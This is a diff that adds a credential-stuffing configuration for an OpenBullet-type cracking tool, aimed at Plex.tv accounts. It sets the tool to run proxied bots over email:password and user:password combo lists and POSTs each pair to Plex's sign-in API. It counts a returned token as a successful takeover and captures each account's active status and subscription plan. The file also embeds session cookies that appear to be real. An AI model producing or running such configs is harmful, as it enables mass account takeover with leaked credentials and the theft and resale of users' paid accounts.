@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "Plex.tv",
+  "SuggestedBots": 150,
+  "LastModified": "2018-06-13T11:22:04.7623615+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje [ KEEPIT.ONLINE ]",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_REQUEST REQUEST POST "https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20Auth%20App&X-Plex-Version=Unknown&X-Plex-Client-Identifier=dad49fe2-f9b5-5369-bbb7-2a33e5fdcc62&X-Plex-Platform=Chrome&X-Plex-Platform-Version=66.0&X-Plex-Device=Windows&X-Plex-Device-Name=Plex%20Auth%20App%20%28Chrome%29&X-Plex-Device-Screen-Resolution=1366x637%2C1366x768" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&password=<PASS>&rememberMe=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  COOKIE "Cookie: _ga=GA1.2.1459096997.1528887638; _gid=GA1.2.1901765107.1528887638; _vwo_uuid_v2=D35BAD52B7EE031306B90B2F08B5086B7|1e613b4b72a23b4787384f6e6529756e; _my-plex_session_32=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTBmOWI4ZjFlNDAyZTY2NTIwMGJmZGQ0MzM3YmVhMDE1BjsAVEkiHHRlbXBfYW5hbHl0aWNzX2lkZW50aXR5BjsARkkiFWd6MmFobG8yNnF4NW95ZGMGOwBGSSIMcmVmZXJlcgY7AEYiGWh0dHBzOi8vd3d3LnBsZXgudHYv--f46b424ad5ce1316f13bb8492b74441837e0bfee; __cfduid=dc7106d97c5a686ea7107355a0aa958cf1528887679" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://app.plex.tv/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "User could not be authenticated" 
+  KEYCHAIN Success OR 
+    KEY "\"token\":\"" 
+PARSE "<SOURCE>" LR "\"active\":" "," Recursive=FALSE -> CAP "Active" "" "" 
+PARSE "<SOURCE>" LR "\"status\":\"" "\"" Recursive=FALSE -> CAP "Status" "" "" 
+PARSE "<SOURCE>" LR "\"plan\":" "," Recursive=FALSE -> CAP "Plan" "" "" 
